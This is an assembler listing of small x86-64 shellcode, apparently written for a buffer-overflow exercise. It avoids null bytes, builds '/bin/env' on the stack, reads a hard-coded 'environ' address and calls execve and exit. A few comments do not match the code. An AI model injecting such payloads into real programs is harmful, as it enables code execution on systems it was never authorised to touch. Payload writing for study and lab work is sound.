     1                                  BITS 64
     2                                  
     3                                  section .text
     4                                  global _start
     5                                  
     6                                  _start:
     7                                      
     8                                      ; Clear the registers
     9 00000000 4831C0                      xor rax, rax
    10 00000003 4831FF                      xor rdi, rdi
    11 00000006 4831F6                      xor rsi, rsi
    12 00000009 4831D2                      xor rdx, rdx
    13                                  
    14                                      ; move /bin/env into stack
    15                                      ; Set up "/bin/env" string on the stack
    16 0000000C 50                          push rax            ; Terminating NULL for the string
    17 0000000D 48BF2F62696E2F656E-         mov rdi, '/bin/env' ; "/bin/env" in reverse (little endian)
    17 00000016 76                 
    18 00000017 57                          push rdi
    19                                  
    20                                      ; Set rdi to point to the "/bin/env" string
    21 00000018 4889E7                      mov rdi, rsp
    22                                  
    23                                      ; Set up the argv array on the stack
    24 0000001B 50                          push rax            ; Terminating NULL pointer for argv
    25 0000001C 57                          push rdi            ; Pointer to "/bin/env"
    26                                  
    27                                      ; Set rsi to point to the argv array
    28 0000001D 4889E6                      mov rsi, rsp
    29                                  
    30                                      ;load the contents of the environ variable 0x7ffff7fbe600 <environ> into the rdx
    31                                      ; Clear the rdx register (all 0 bits)
    32 00000020 4831D2                      xor rdx, rdx
    33                                  
    34                                      ; Load 0x7fff into the low 16 bits of the rdx register (dx)
    35 00000023 66BAFF7F                    mov dx, 0x7fff
    36                                  
    37                                      ; Left shift the rdx register by 32 bits
    38 00000027 48C1E220                    shl rdx, 32
    39                                  
    40                                      ; Load 0xf7fbe6ff into the low 32 bits of rcx (ecx, this also clears the rest of rcx)
    41 0000002B B9FFE6FBF7                  mov ecx, 0xf7fbe6ff
    42                                  
    43                                      ; Clear the low 8 bits of the rcx register (cl) without introducing null character
    44 00000030 48C1E908                    shr rcx, 8  ; Shift right by 8 bits to bring back the original upper bits
    45 00000034 48C1E108                    shl rcx, 8  ; Shift left by 8 bits, which clears the low 8 bits
    46                                  
    47                                      ; Combine the registers using the OR instruction
    48 00000038 4809CA                      or rdx, rcx
    49                                  
    50                                      ; Load the rdx register with the memory pointed to by the rdx register
    51 0000003B 488B12                      mov rdx, [rdx]
    52                                  
    53                                  
    54                                      ; Set up the syscall to execute /bin/env
    55                                      ; Setup for execve system call
    56 0000003E 4831C0                      xor rax, rax       ; Clear rax to ensure no higher bits are set
    57 00000041 B03B                        mov al, 0x3B       ; 0x3B is the syscall number for execve in x86-64
    58                                      ; At this point, make sure rdi, rsi, and rdx are set up appropriately for execve
    59 00000043 0F05                        syscall            ; Perform the execve syscall
    60                                  
    61                                      ; Setup for exit system call
    62 00000045 4889C7                      mov rdi, rax       ; Move the return code from execve to rdi
    63 00000048 4831C0                      xor rax, rax       ; Clear rax to ensure no higher bits are set
    64 0000004B B03C                        mov al, 0x3C       ; 0x3C is the syscall number for exit in x86-64
    65 0000004D 0F05                        syscall            ; Perform the exit syscall
    66                                  
    67 0000004F FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff   ; push the pointer to '/bin/env'
    68 00000057 FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff   ; push the secon rzx null
    69 0000005F FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff   ; push the '/bin/env'
    70 00000067 FFFFFFFFFFFFFFFF            dq 0xffffffffffffffff   ; push the first rax null
    71 0000006F 6F000000                end: dd end-_start 
